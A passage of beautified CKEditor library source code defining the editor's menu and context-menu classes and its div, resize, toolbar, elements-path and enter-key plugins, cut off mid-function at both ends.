                    css: [ CKEDITOR.skin.getPath("editor") ],
                    level: this._.level - 1,
                    block: {}
                }), i = n.block.attributes = n.attributes || {};
                !i.role && (i.role = "menu"), this._.panelDefinition = n;
            },
            _: {
                onShow: function() {
                    var e = this.editor.getSelection(), t = e && e.getStartElement(), n = this.editor.elementPath(), i = this._.listeners;
                    this.removeAll();
                    for (var o = 0; o < i.length; o++) {
                        var a = i[o](t, e, n);
                        if (a) for (var r in a) {
                            var s = this.editor.getMenuItem(r);
                            !s || s.command && !this.editor.getCommand(s.command).state || (s.state = a[r],
                            this.add(s));
                        }
                    }
                },
                onClick: function(e) {
                    this.hide(), e.onClick ? e.onClick() : e.command && this.editor.execCommand(e.command);
                },
                onEscape: function(e) {
                    var t = this.parent;
                    return t ? t._.panel.hideChild(1) : 27 == e && this.hide(1), !1;
                },
                onHide: function() {
                    this.onHide && this.onHide();
                },
                showSubMenu: function(e) {
                    var t = this._.subMenu, n = this.items[e];
                    if (n = n.getItems && n.getItems()) {
                        for (var i in t ? t.removeAll() : ((t = this._.subMenu = new CKEDITOR.menu(this.editor, CKEDITOR.tools.extend({}, this._.definition, {
                            level: this._.level + 1
                        }, !0))).parent = this, t._.onClick = CKEDITOR.tools.bind(this._.onClick, this)),
                        n) {
                            var o = this.editor.getMenuItem(i);
                            o && (o.state = n[i], t.add(o));
                        }
                        var a = this._.panel.getBlock(this.id).element.getDocument().getById(this.id + "" + e);
                        setTimeout(function() {
                            t.show(a, 2);
                        }, 0);
                    } else this._.panel.hideChild(1);
                }
            },
            proto: {
                add: function(e) {
                    e.order || (e.order = this.items.length), this.items.push(e);
                },
                removeAll: function() {
                    this.items = [];
                },
                show: function(e, t, n, i) {
                    if (this.parent || (this._.onShow(), this.items.length)) {
                        t = t || ("rtl" == this.editor.lang.dir ? 2 : 1);
                        var o = this.items, a = this.editor, r = this._.panel, s = this._.element;
                        r || ((r = this._.panel = new CKEDITOR.ui.floatPanel(this.editor, CKEDITOR.document.getBody(), this._.panelDefinition, this._.level)).onEscape = CKEDITOR.tools.bind(function(e) {
                            if (!1 === this._.onEscape(e)) return !1;
                        }, this), r.onShow = function() {
                            r._.panel.getHolderElement().getParent().addClass("cke cke_reset_all");
                        }, r.onHide = CKEDITOR.tools.bind(function() {
                            this._.onHide && this._.onHide();
                        }, this), (s = r.addBlock(this.id, this._.panelDefinition.block)).autoSize = !0,
                        (l = s.keys)[40] = "next", l[9] = "next", l[38] = "prev", l[CKEDITOR.SHIFT + 9] = "prev",
                        l["rtl" == a.lang.dir ? 37 : 39] = CKEDITOR.env.ie ? "mouseup" : "click", l[32] = CKEDITOR.env.ie ? "mouseup" : "click",
                        CKEDITOR.env.ie && (l[13] = "mouseup"), (l = (s = this._.element = s.element).getDocument()).getBody().setStyle("overflow", "hidden"),
                        l.getElementsByTag("html").getItem(0).setStyle("overflow", "hidden"), this._.itemOverFn = CKEDITOR.tools.addFunction(function(e) {
                            clearTimeout(this._.showSubTimeout), this._.showSubTimeout = CKEDITOR.tools.setTimeout(this._.showSubMenu, a.config.menu_subMenuDelay || 400, this, [ e ]);
                        }, this), this._.itemOutFn = CKEDITOR.tools.addFunction(function() {
                            clearTimeout(this._.showSubTimeout);
                        }, this), this._.itemClickFn = CKEDITOR.tools.addFunction(function(e) {
                            var t = this.items[e];
                            t.state == CKEDITOR.TRISTATE_DISABLED ? this.hide(1) : t.getItems ? this._.showSubMenu(e) : this._.onClick(t);
                        }, this)), o.sort(function(e, t) {
                            return e.group < t.group ? -1 : e.group > t.group ? 1 : e.order < t.order ? -1 : e.order > t.order ? 1 : 0;
                        });
                        for (var l = [ '<div class="cke_menu' + ((l = a.elementPath()) && l.direction() != a.lang.dir ? " cke_mixed_dir_content" : "") + '" role="presentation">' ], c = o.length, d = c && o[0].group, u = 0; u < c; u++) {
                            var h = o[u];
                            d != h.group && (l.push('<div class="cke_menuseparator" role="separator"></div>'),
                            d = h.group), h.render(this, u, l);
                        }
                        l.push("</div>"), s.setHtml(l.join("")), CKEDITOR.ui.fire("ready", this), this.parent ? this.parent._.panel.showAsChild(r, this.id, e, t, n, i) : r.showBlock(this.id, e, t, n, i),
                        a.fire("menuShow", [ r ]);
                    }
                },
                addListener: function(e) {
                    this._.listeners.push(e);
                },
                hide: function(e) {
                    this._.onHide && this._.onHide(), this._.panel && this._.panel.hide(e);
                }
            }
        }), CKEDITOR.menuItem = CKEDITOR.tools.createClass({
            $: function(e, t, n) {
                CKEDITOR.tools.extend(this, n, {
                    order: 0,
                    className: "cke_menubutton__" + t
                }), this.group = e._.menuGroups[this.group], this.editor = e, this.name = t;
            },
            proto: {
                render: function(e, t, n) {
                    var i = e.id + "" + t, o = void 0 === this.state ? CKEDITOR.TRISTATE_OFF : this.state, a = "", r = o == CKEDITOR.TRISTATE_ON ? "on" : o == CKEDITOR.TRISTATE_DISABLED ? "disabled" : "off";
                    this.role in {
                        menuitemcheckbox: 1,
                        menuitemradio: 1
                    } && (a = ' aria-checked="' + (o == CKEDITOR.TRISTATE_ON ? "true" : "false") + '"');
                    var s = this.getItems, l = "&#" + ("rtl" == this.editor.lang.dir ? "9668" : "9658") + ";", c = this.name;
                    this.icon && !/\./.test(this.icon) && (c = this.icon), e = {
                        id: i,
                        name: this.name,
                        iconName: c,
                        label: this.label,
                        cls: this.className || "",
                        state: r,
                        hasPopup: s ? "true" : "false",
                        disabled: o == CKEDITOR.TRISTATE_DISABLED,
                        title: this.label,
                        href: "javascript:void('" + (this.label || "").replace("'") + "')",
                        hoverFn: e._.itemOverFn,
                        moveOutFn: e._.itemOutFn,
                        clickFn: e._.itemClickFn,
                        index: t,
                        iconStyle: CKEDITOR.skin.getIconStyle(c, "rtl" == this.editor.lang.dir, c == this.icon ? null : this.icon, this.iconOffset),
                        arrowHtml: s ? u.output({
                            label: l
                        }) : "",
                        role: this.role ? this.role : "menuitem",
                        ariaChecked: a
                    }, d.output(e, n);
                }
            }
        });
    }(), CKEDITOR.config.menu_groups = "clipboard,form,tablecell,tablecellproperties,tablerow,tablecolumn,table,anchor,link,image,flash,checkbox,radio,textfield,hiddenfield,imagebutton,button,select,textarea,div",
    CKEDITOR.plugins.add("contextmenu", {
        requires: "menu",
        onLoad: function() {
            CKEDITOR.plugins.contextMenu = CKEDITOR.tools.createClass({
                base: CKEDITOR.menu,
                $: function(e) {
                    this.base.call(this, e, {
                        panel: {
                            className: "cke_menu_panel",
                            attributes: {
                                "aria-label": e.lang.contextmenu.options
                            }
                        }
                    });
                },
                proto: {
                    addTarget: function(e, r) {
                        if (e.on("contextmenu", function(e) {
                            e = e.data;
                            var t = CKEDITOR.env.webkit ? s : CKEDITOR.env.mac ? e.$.metaKey : e.$.ctrlKey;
                            if (!r || !t) {
                                e.preventDefault(), CKEDITOR.env.mac && CKEDITOR.env.webkit && (t = this.editor,
                                (n = new CKEDITOR.dom.elementPath(e.getTarget(), t.editable()).contains(function(e) {
                                    return e.hasAttribute("contenteditable");
                                }, !0)) && "false" == n.getAttribute("contenteditable") && t.getSelection().fake(n));
                                var n = e.getTarget().getDocument(), i = e.getTarget().getDocument().getDocumentElement(), o = (t = !n.equals(CKEDITOR.document),
                                n = n.getWindow().getScrollPosition(), t ? e.$.clientX : e.$.pageX || n.x + e.$.clientX), a = t ? e.$.clientY : e.$.pageY || n.y + e.$.clientY;
                                CKEDITOR.tools.setTimeout(function() {
                                    this.open(i, null, o, a);
                                }, CKEDITOR.env.ie ? 200 : 0, this);
                            }
                        }, this), CKEDITOR.env.webkit) {
                            var s, t = function() {
                                s = 0;
                            };
                            e.on("keydown", function(e) {
                                s = CKEDITOR.env.mac ? e.data.$.metaKey : e.data.$.ctrlKey;
                            }), e.on("keyup", t), e.on("contextmenu", t);
                        }
                    },
                    open: function(e, t, n, i) {
                        this.editor.focus(), e = e || CKEDITOR.document.getDocumentElement(), this.editor.selectionChange(1),
                        this.show(e, t, n, i);
                    }
                }
            });
        },
        beforeInit: function(e) {
            var t = e.contextMenu = new CKEDITOR.plugins.contextMenu(e);
            e.on("contentDom", function() {
                t.addTarget(e.editable(), !1 !== e.config.browserContextMenuOnCtrl);
            }), e.addCommand("contextMenu", {
                exec: function() {
                    e.contextMenu.open(e.document.getBody());
                }
            }), e.setKeystroke(CKEDITOR.SHIFT + 121, "contextMenu"), e.setKeystroke(CKEDITOR.CTRL + CKEDITOR.SHIFT + 121, "contextMenu");
        }
    }), CKEDITOR.plugins.add("div", {
        requires: "dialog",
        init: function(t) {
            if (!t.blockless) {
                var e = t.lang.div, n = "div(*)";
                CKEDITOR.dialog.isTabEnabled(t, "editdiv", "advanced") && (n += ";div[dir,id,lang,title]{*}"),
                t.addCommand("creatediv", new CKEDITOR.dialogCommand("creatediv", {
                    allowedContent: n,
                    requiredContent: "div",
                    contextSensitive: !0,
                    refresh: function(e, t) {
                        this.setState("div" in (e.config.div_wrapTable ? t.root : t.blockLimit).getDtd() ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED);
                    }
                })), t.addCommand("editdiv", new CKEDITOR.dialogCommand("editdiv", {
                    requiredContent: "div"
                })), t.addCommand("removediv", {
                    requiredContent: "div",
                    exec: function(t) {
                        function e(e) {
                            (e = CKEDITOR.plugins.div.getSurroundDiv(t, e)) && !e.data("cke-div-added") && (r.push(e),
                            e.data("cke-div-added"));
                        }
                        for (var n, i = t.getSelection(), o = i && i.getRanges(), a = i.createBookmarks(), r = [], s = 0; s < o.length; s++) (n = o[s]).collapsed ? e(i.getStartElement()) : ((n = new CKEDITOR.dom.walker(n)).evaluator = e,
                        n.lastForward());
                        for (s = 0; s < r.length; s++) r[s].remove(!0);
                        i.selectBookmarks(a);
                    }
                }), t.ui.addButton && t.ui.addButton("CreateDiv", {
                    label: e.toolbar,
                    command: "creatediv",
                    toolbar: "blocks,50"
                }), t.addMenuItems && (t.addMenuItems({
                    editdiv: {
                        label: e.edit,
                        command: "editdiv",
                        group: "div",
                        order: 1
                    },
                    removediv: {
                        label: e.remove,
                        command: "removediv",
                        group: "div",
                        order: 5
                    }
                }), t.contextMenu && t.contextMenu.addListener(function(e) {
                    return !e || e.isReadOnly() ? null : CKEDITOR.plugins.div.getSurroundDiv(t) ? {
                        editdiv: CKEDITOR.TRISTATE_OFF,
                        removediv: CKEDITOR.TRISTATE_OFF
                    } : null;
                })), CKEDITOR.dialog.add("creatediv", this.path + "dialogs/div.js"), CKEDITOR.dialog.add("editdiv", this.path + "dialogs/div.js");
            }
        }
    }), CKEDITOR.plugins.div = {
        getSurroundDiv: function(e, t) {
            var n = e.elementPath(t);
            return e.elementPath(n.blockLimit).contains(function(e) {
                return e.is("div") && !e.isReadOnly();
            }, 1);
        }
    }, CKEDITOR.plugins.add("resize", {
        init: function(o) {
            function t(e) {
                var t = a, n = r, i = t + (e.data.$.screenX - s) * ("rtl" == d ? -1 : 1);
                e = n + (e.data.$.screenY - l), h && (t = Math.max(c.resize_minWidth, Math.min(i, c.resize_maxWidth))),
                f && (n = Math.max(c.resize_minHeight, Math.min(e, c.resize_maxHeight))), o.resize(h ? t : null, n);
            }
            function n() {
                CKEDITOR.document.removeListener("mousemove", t), CKEDITOR.document.removeListener("mouseup", n),
                o.document && (o.document.removeListener("mousemove", t), o.document.removeListener("mouseup", n));
            }
            var a, r, s, l, c = o.config, i = o.ui.spaceId("resizer"), d = o.element ? o.element.getDirection(1) : "ltr";
            if (!c.resize_dir && (c.resize_dir = "vertical"), void 0 === c.resize_maxWidth && (c.resize_maxWidth = 3e3),
            void 0 === c.resize_maxHeight && (c.resize_maxHeight = 3e3), void 0 === c.resize_minWidth && (c.resize_minWidth = 750),
            void 0 === c.resize_minHeight && (c.resize_minHeight = 250), !1 !== c.resize_enabled) {
                var u = null, h = ("both" == c.resize_dir || "horizontal" == c.resize_dir) && c.resize_minWidth != c.resize_maxWidth, f = ("both" == c.resize_dir || "vertical" == c.resize_dir) && c.resize_minHeight != c.resize_maxHeight, m = CKEDITOR.tools.addFunction(function(e) {
                    u || (u = o.getResizable()), a = u.$.offsetWidth || 0, r = u.$.offsetHeight || 0,
                    s = e.screenX, l = e.screenY, c.resize_minWidth > a && (c.resize_minWidth = a),
                    c.resize_minHeight > r && (c.resize_minHeight = r), CKEDITOR.document.on("mousemove", t),
                    CKEDITOR.document.on("mouseup", n), o.document && (o.document.on("mousemove", t),
                    o.document.on("mouseup", n)), e.preventDefault && e.preventDefault();
                });
                o.on("destroy", function() {
                    CKEDITOR.tools.removeFunction(m);
                }), o.on("uiSpace", function(e) {
                    if ("bottom" == e.data.space) {
                        var t = "";
                        h && !f && (t = " cke_resizer_horizontal"), !h && f && (t = " cke_resizer_vertical");
                        var n = '<span id="' + i + '" class="cke_resizer' + t + " cke_resizer_" + d + '" title="' + CKEDITOR.tools.htmlEncode(o.lang.common.resize) + '" onmousedown="CKEDITOR.tools.callFunction(' + m + ', event)">' + ("ltr" == d ? "◢" : "◣") + "</span>";
                        "ltr" == d && "ltr" == t ? e.data.html += n : e.data.html = n + e.data.html;
                    }
                }, o, null, 100), o.on("maximize", function(e) {
                    o.ui.space("resizer")[e.data == CKEDITOR.TRISTATE_ON ? "hide" : "show"]();
                });
            }
        }
    }), function() {
        function I(e) {
            return e._.toolbarGroups || (e._.toolbarGroups = [ {
                name: "document",
                groups: [ "mode", "document", "doctools" ]
            }, {
                name: "clipboard",
                groups: [ "clipboard", "undo" ]
            }, {
                name: "editing",
                groups: [ "find", "selection", "spellchecker" ]
            }, {
                name: "forms"
            }, "/", {
                name: "basicstyles",
                groups: [ "basicstyles", "cleanup" ]
            }, {
                name: "paragraph",
                groups: [ "list", "indent", "blocks", "align", "bidi" ]
            }, {
                name: "links"
            }, {
                name: "insert"
            }, "/", {
                name: "styles"
            }, {
                name: "colors"
            }, {
                name: "tools"
            }, {
                name: "others"
            }, {
                name: "about"
            } ]);
        }
        var O = function() {
            this.toolbars = [], this.focusCommandExecuted = !1;
        };
        O.prototype.focus = function() {
            for (var e, t = 0; e = this.toolbars[t++]; ) for (var n, i = 0; n = e.items[i++]; ) if (n.focus) return void n.focus();
        };
        var e = {
            modes: {
                wysiwyg: 1,
                source: 1
            },
            readOnly: 1,
            exec: function(e) {
                e.toolbox && (e.toolbox.focusCommandExecuted = !0, CKEDITOR.env.ie || CKEDITOR.env.air ? setTimeout(function() {
                    e.toolbox.focus();
                }, 100) : e.toolbox.focus());
            }
        };
        CKEDITOR.plugins.add("toolbar", {
            requires: "button",
            init: function(T) {
                var r, C = function(e, t) {
                    var n, i = (o = "rtl" == T.lang.dir) ? 37 : 39, o = o ? 39 : 37, a = void 0 === (a = T.config.toolbarGroupCycling) || a;
                    switch (t) {
                      case 9:
                      case CKEDITOR.SHIFT + 9:
                        for (;!n || !n.items.length; ) if ((n = 9 == t ? (n ? n.next : e.toolbar.next) || T.toolbox.toolbars[0] : (n ? n.previous : e.toolbar.previous) || T.toolbox.toolbars[T.toolbox.toolbars.length - 1]).items.length) for (e = n.items[r ? n.items.length - 1 : 0]; e && !e.focus; ) (e = r ? e.previous : e.next) || (n = 0);
                        return e && e.focus(), !1;

                      case i:
                        for (n = e; !(n = n.next) && a && (n = e.toolbar.items[0]), n && !n.focus; ) ;
                        return n ? n.focus() : C(e, 9), !1;

                      case 40:
                        return e.button && e.button.hasArrow ? (T.once("panelShow", function(e) {
                            e.data._.panel._.currentBlock.onKeyDown(40);
                        }), e.execute()) : C(e, 40 == t ? i : o), !1;

                      case o:
                      case 38:
                        for (n = e; !(n = n.previous) && a && (n = e.toolbar.items[e.toolbar.items.length - 1]),
                        n && !n.focus; ) ;
                        return n ? n.focus() : (r = 1, C(e, CKEDITOR.SHIFT + 9), r = 0), !1;

                      case 27:
                        return T.focus(), !1;

                      case 13:
                      case 32:
                        return e.execute(), !1;
                    }
                    return !0;
                };
                T.on("uiSpace", function(e) {
                    if (e.data.space == T.config.toolbarLocation) {
                        e.removeListener(), T.toolbox = new O();
                        var t, n, i = [ '<span id="', o = CKEDITOR.tools.getNextId(), '" class="cke_voice_label">', T.lang.toolbar.toolbars, "</span>", '<span id="' + T.ui.spaceId("toolbox") + '" class="cke_toolbox" role="group" aria-labelledby="', o, '" onmousedown="return false;">' ], o = !1 !== T.config.toolbarStartupExpanded;
                        T.config.toolbarCanCollapse && T.elementMode != CKEDITOR.ELEMENT_MODE_INLINE && i.push('<span class="cke_toolbox_main"' + (o ? ">" : ' style="display:none">'));
                        for (var a = T.toolbox.toolbars, r = function(s) {
                            function l(e, t) {
                                if (t.length) {
                                    e.items ? e.items.push(s.ui.create("-")) : e.items = [];
                                    for (var n; n = t.shift(); ) n = "string" == typeof n ? n : n.name, i && -1 != CKEDITOR.tools.indexOf(i, n) || (n = s.ui.create(n)) && s.addFeature(n) && e.items.push(n);
                                }
                            }
                            var i = (i = s.config.removeButtons) && i.split(","), e = s.config.toolbar;
                            return "string" == typeof e && (e = s.config["toolbar_" + e]), s.toolbar = e ? function(e) {
                                var t, n, i, o = [];
                                for (t = 0; t < e.length; ++t) i = {}, "/" == (n = e[t]) ? o.push(n) : CKEDITOR.tools.isArray(n) ? (l(i, CKEDITOR.tools.clone(n)),
                                o.push(i)) : n.items && (l(i, CKEDITOR.tools.clone(n.items)), i.name = n.name, o.push(i));
                                return o;
                            }(e) : function() {
                                for (var e = function() {
                                    var e, t, n, i = {};
                                    for (e in s.ui.items) t = (n = (n = (t = s.ui.items[e]).toolbar || "others").split(","))[0],
                                    n = parseInt(n[1] || -1, 10), i[t] || (i[t] = []), i[t].push({
                                        name: e,
                                        order: n
                                    });
                                    for (t in i) i[t] = i[t].sort(function(e, t) {
                                        return e.order == t.order ? 0 : t.order < 0 ? -1 : e.order < 0 ? 1 : e.order < t.order ? -1 : 1;
                                    });
                                    return i;
                                }(), t = CKEDITOR.tools.clone(s.config.toolbarGroups) || I(s), n = 0; n < t.length; n++) {
                                    var i = t[n];
                                    if ("/" != i) {
                                        "string" == typeof i && (i = t[n] = {
                                            name: i
                                        });
                                        var o, a = i.groups;
                                        if (a) for (var r = 0; r < a.length; r++) (o = e[o = a[r]]) && l(i, o);
                                        (o = e[i.name]) && l(i, o);
                                    }
                                }
                                return t;
                            }();
                        }(T), s = 0; s < r.length; s++) {
                            var l, c, d, u = 0, h = r[s];
                            if (h) if (t && (i.push("</span>"), n = t = 0), "/" === h) i.push('<span class="cke_toolbar_break"></span>'); else {
                                d = h.items || h;
                                for (var f = 0; f < d.length; f++) {
                                    var m, g = d[f];
                                    if (g) if (g.type == CKEDITOR.UI_SEPARATOR) n = t && g; else {
                                        if (m = !1 !== g.canGroup, !u) {
                                            l = CKEDITOR.tools.getNextId(), u = {
                                                id: l,
                                                items: []
                                            }, c = h.name && (T.lang.toolbar.toolbarGroups[h.name] || h.name), i.push('<span id="', l, '" class="cke_toolbar"', c ? ' aria-labelledby="' + l + '_label"' : "", ' role="toolbar">'),
                                            c && i.push('<span id="', l, '_label" class="cke_voice_label">', c, "</span>"),
                                            i.push('<span class="cke_toolbar_start"></span>');
                                            var E = a.push(u) - 1;
                                            0 < E && (u.previous = a[E - 1], u.previous.next = u);
                                        }
                                        m ? t || (i.push('<span class="cke_toolgroup" role="presentation">'), t = 1) : t && (i.push("</span>"),
                                        t = 0), l = function(e) {
                                            e = e.render(T, i), 0 < (E = u.items.push(e) - 1) && (e.previous = u.items[E - 1],
                                            e.previous.next = e), e.toolbar = u, e.onkey = C, e.onfocus = function() {
                                                T.toolbox.focusCommandExecuted || T.focus();
                                            };
                                        }, n && (l(n), n = 0), l(g);
                                    }
                                }
                                t && (i.push("</span>"), n = t = 0), u && i.push('<span class="cke_toolbar_end"></span></span>');
                            }
                        }
                        if (T.config.toolbarCanCollapse && i.push("</span>"), T.config.toolbarCanCollapse && T.elementMode != CKEDITOR.ELEMENT_MODE_INLINE) {
                            var p = CKEDITOR.tools.addFunction(function() {
                                T.execCommand("toolbarCollapse");
                            });
                            T.on("destroy", function() {
                                CKEDITOR.tools.removeFunction(p);
                            }), T.addCommand("toolbarCollapse", {
                                readOnly: 1,
                                exec: function(e) {
                                    var t = e.ui.space("toolbar_collapser"), n = t.getPrevious(), i = e.ui.space("contents"), o = n.getParent(), a = parseInt(i.$.style.height, 10), r = o.$.offsetHeight, s = t.hasClass("cke_toolbox_collapser_min");
                                    s ? (n.show(), t.removeClass("cke_toolbox_collapser_min"), t.setAttribute("title", e.lang.toolbar.toolbarCollapse)) : (n.hide(),
                                    t.addClass("cke_toolbox_collapser_min"), t.setAttribute("title", e.lang.toolbar.toolbarExpand)),
                                    t.getFirst().setText(s ? "▲" : "◀"), i.setStyle("height", a - (o.$.offsetHeight - r) + "px"),
                                    e.fire("resize");
                                },
                                modes: {
                                    wysiwyg: 1,
                                    source: 1
                                }
                            }), T.setKeystroke(CKEDITOR.ALT + (CKEDITOR.env.ie || CKEDITOR.env.webkit ? 189 : 109), "toolbarCollapse"),
                            i.push('<a title="' + (o ? T.lang.toolbar.toolbarCollapse : T.lang.toolbar.toolbarExpand) + '" id="' + T.ui.spaceId("toolbar_collapser") + '" tabIndex="-1" class="cke_toolbox_collapser'),
                            o || i.push(" cke_toolbox_collapser_min"), i.push('" onclick="CKEDITOR.tools.callFunction(' + p + ')">', '<span class="cke_arrow">&#9650;</span>', "</a>");
                        }
                        i.push("</span>"), e.data.html += i.join("");
                    }
                }), T.on("destroy", function() {
                    if (this.toolbox) {
                        var e, t, n, i, o = 0;
                        for (e = this.toolbox.toolbars; o < e.length; o++) for (n = e[o].items, t = 0; t < n.length; t++) (i = n[t]).clickFn && CKEDITOR.tools.removeFunction(i.clickFn),
                        i.keyDownFn && CKEDITOR.tools.removeFunction(i.keyDownFn);
                    }
                }), T.on("uiReady", function() {
                    var e = T.ui.space("toolbox");
                    e && T.focusManager.add(e, 1);
                }), T.addCommand("toolbarFocus", e), T.setKeystroke(CKEDITOR.ALT + 121, "toolbarFocus"),
                T.ui.add("-", CKEDITOR.UI_SEPARATOR, {}), T.ui.addHandler(CKEDITOR.UI_SEPARATOR, {
                    create: function() {
                        return {
                            render: function(e, t) {
                                return t.push('<span class="cke_toolbar_separator" role="separator"></span>'), {};
                            }
                        };
                    }
                });
            }
        }), CKEDITOR.ui.prototype.addToolbarGroup = function(e, t, n) {
            var i = I(this.editor), o = 0 === t, a = {
                name: e
            };
            if (n) {
                if (n = CKEDITOR.tools.search(i, function(e) {
                    return e.name == n;
                })) return !n.groups && (n.groups = []), t && 0 <= (t = CKEDITOR.tools.indexOf(n.groups, t)) ? void n.groups.splice(t + 1, 0, e) : void (o ? n.groups.splice(0, 0, e) : n.groups.push(e));
                t = null;
            }
            t && (t = CKEDITOR.tools.indexOf(i, function(e) {
                return e.name == t;
            })), o ? i.splice(0, 0, e) : "number" == typeof t ? i.splice(t + 1, 0, a) : i.push(e);
        };
    }(), CKEDITOR.UI_SEPARATOR = "separator", CKEDITOR.config.toolbarLocation = "top",
    function() {
        var n;
        n = {
            editorFocus: !1,
            readOnly: 1,
            exec: function(e) {
                (e = CKEDITOR.document.getById(e._.elementsPath.idBase + "0")) && e.focus(CKEDITOR.env.ie || CKEDITOR.env.air);
            }
        };
        var C = '<span class="cke_path_empty">&nbsp;</span>', e = "";
        CKEDITOR.env.gecko && CKEDITOR.env.mac && (e += ' onkeypress="return false;"'),
        CKEDITOR.env.gecko && (e += ' onblur="this.style.cssText = this.style.cssText;"');
        var I = CKEDITOR.addTemplate("pathItem", '<a id="{id}" href="{jsTitle}" tabindex="-1" class="cke_path_item" title="{label}"' + e + ' hidefocus="true"  onkeydown="return CKEDITOR.tools.callFunction({keyDownFn},{index}, event );" onclick="CKEDITOR.tools.callFunction({clickFn},{index}); return false;" role="button" aria-label="{label}">{text}</a>');
        CKEDITOR.plugins.add("elementspath", {
            init: function(t) {
                t._.elementsPath = {
                    idBase: "cke_elementspath_" + CKEDITOR.tools.getNextNumber() + "_",
                    filters: []
                }, t.on("uiSpace", function(e) {
                    "bottom" == e.data.space && function(h, e) {
                        function o(e) {
                            if ((e = g.list[e]).equals(h.editable()) || "true" == e.getAttribute("contenteditable")) {
                                var t = h.createRange();
                                t.selectNodeContents(e), t.select();
                            } else h.getSelection().selectElement(e);
                            h.focus();
                        }
                        function t() {
                            f && f.setHtml(C), delete g.list;
                        }
                        var f, m = h.ui.spaceId("path"), g = h._.elementsPath, E = g.idBase;
                        e.html += '<span id="' + m + '_label" class="cke_voice_label">' + h.lang.elementspath.eleLabel + '</span><span id="' + m + '" class="cke_path" role="group" aria-labelledby="' + m + '_label">' + C + "</span>",
                        h.on("uiReady", function() {
                            var e = h.ui.space("path");
                            e && h.focusManager.add(e, 1);
                        }), g.onClick = o;
                        var p = CKEDITOR.tools.addFunction(o), T = CKEDITOR.tools.addFunction(function(e, t) {
                            var n, i = g.idBase;
                            switch (t = new CKEDITOR.dom.event(t), n = "rtl" == h.lang.dir, t.getKeystroke()) {
                              case n ? 39 : 37:
                              case 9:
                                return (n = CKEDITOR.document.getById(i + (e + 1))) || (n = CKEDITOR.document.getById(i + "0")),
                                n.focus(), !1;

                              case n ? 37 : 39:
                              case CKEDITOR.SHIFT + 9:
                                return (n = CKEDITOR.document.getById(i + (e - 1))) || (n = CKEDITOR.document.getById(i + (g.list.length - 1))),
                                n.focus(), !1;

                              case 27:
                                return h.focus(), !1;

                              case 13:
                              case 32:
                                return o(e), !1;
                            }
                            return !0;
                        });
                        h.on("selectionChange", function() {
                            for (var e, t = [], n = g.list = [], i = [], o = g.filters, a = !0, r = h.elementPath().elements, s = r.length; s--; ) {
                                var l = r[s], c = 0;
                                e = l.data("cke-display-name") ? l.data("cke-display-name") : l.data("cke-real-element-type") ? l.data("cke-real-element-type") : l.getName(),
                                !(a = l.hasAttribute("contenteditable") ? "true" == l.getAttribute("contenteditable") : a) && !l.hasAttribute("contenteditable") && (c = 1);
                                for (var d = 0; d < o.length; d++) {
                                    var u = o[d](l, e);
                                    if (!1 === u) {
                                        c = 1;
                                        break;
                                    }
                                    e = u || e;
                                }
                                c || (n.unshift(l), i.unshift(e));
                            }
                            for (n = n.length, o = 0; o < n; o++) e = i[o], a = h.lang.elementspath.eleTitle.replace(/%1/, e),
                            e = I.output({
                                id: E + o,
                                label: a,
                                text: e,
                                jsTitle: "javascript:void('" + e + "')",
                                index: o,
                                keyDownFn: T,
                                clickFn: p
                            }), t.unshift(e);
                            f || (f = CKEDITOR.document.getById(m)), (i = f).setHtml(t.join("") + C), h.fire("elementsPathUpdate", {
                                space: i
                            });
                        }), h.on("readOnly", t), h.on("contentDomUnload", t), h.addCommand("elementsPathFocus", n),
                        h.setKeystroke(CKEDITOR.ALT + 122, "elementsPathFocus");
                    }(t, e.data);
                });
            }
        });
    }(), function() {
        function t(e, t, n) {
            n = e.config.forceEnterMode || n, "wysiwyg" == e.mode && (t || (t = e.activeEnterMode),
            e.elementPath().isContextFor("p") || (t = CKEDITOR.ENTER_BR, n = 1), e.fire("saveSnapshot"),
            t == CKEDITOR.ENTER_BR ? I(e, t, null, n) : c(e, t, null, n), e.fire("saveSnapshot"));
        }
        function p(e) {
            for (var t = (e = e.getSelection().getRanges(!0)).length - 1; 0 < t; t--) e[t].deleteContents();
            return e[0];
        }
        CKEDITOR.plugins.add("enterkey", {
            init: function(e) {
                e.addCommand("enter", {
                    modes: {
                        wysiwyg: 1
                    },
                    editorFocus: !1,
                    exec: function(e) {
                        t(e);
                    }
                }), e.addCommand("shiftEnter", {
                    modes: {
                        wysiwyg: 1
                    },
                    editorFocus: !1,
                    exec: function(e) {
                        t(e, e.activeShiftEnterMode, 1);
                    }
                }), e.setKeystroke([ [ 13, "enter" ], [ CKEDITOR.SHIFT + 13, "shiftEnter" ] ]);
            }
        });
        var T = CKEDITOR.dom.walker.whitespaces(), C = CKEDITOR.dom.walker.bookmark();
        CKEDITOR.plugins.enterkey = {
            enterBlock: function(e, t, n, i) {
                if (n = n || p(e)) {
                    var o, a = (g = n, E = g.startContainer.getAscendant(function(e) {
                        return e.type == CKEDITOR.NODE_ELEMENT && "true" == e.getAttribute("contenteditable");
                    }, !0), n = g.root.equals(E) ? g : ((E = new CKEDITOR.dom.range(E)).moveToRange(g),
                    E)).document, r = n.checkStartOfBlock(), s = n.checkEndOfBlock(), l = e.elementPath(n.startContainer), c = l.block, d = t == CKEDITOR.ENTER_DIV ? "div" : "p";
                    if (r && s) {
                        if (c && (c.is("li") || c.getParent().is("li"))) {
                            c.is("li") || (c = c.getParent()), o = (n = c.getParent()).getParent(), i = !c.hasPrevious();
                            var u = !c.hasNext(), h = (d = e.getSelection()).createBookmarks(), f = (r = c.getDirection(1),
                            s = c.getAttribute("class"), c.getAttribute("style")), m = o.getDirection(1) != r;
                            if (e = e.enterMode != CKEDITOR.ENTER_BR || m || f || s, o.is("li")) i || u ? c[i ? "insertBefore" : "insertAfter"](o) : c.breakParent(o); else {
                                if (e) l.block.is("li") ? (o = a.createElement(t == CKEDITOR.ENTER_P ? "p" : "div"),
                                m && o.setAttribute("dir", r), f && o.setAttribute("style", f), s && o.setAttribute("class", s),
                                c.moveChildren(o)) : o = l.block, i || u ? o[i ? "insertBefore" : "insertAfter"](n) : (c.breakParent(n),
                                o.insertAfter(n)); else if (c.appendBogus(!0), i || u) for (;a = c[i ? "getFirst" : "getLast"](); ) a[i ? "insertBefore" : "insertAfter"](n); else for (c.breakParent(n); a = c.getLast(); ) a.insertAfter(n);
                                c.remove();
                            }
                            return void d.selectBookmarks(h);
                        }
                        if (c && c.getParent().is("blockquote")) return c.breakParent(c.getParent()), c.getPrevious().getFirst(CKEDITOR.dom.walker.invisible(1)) || c.getPrevious().remove(),
                        c.getNext().getFirst(CKEDITOR.dom.walker.invisible(1)) || c.getNext().remove(),
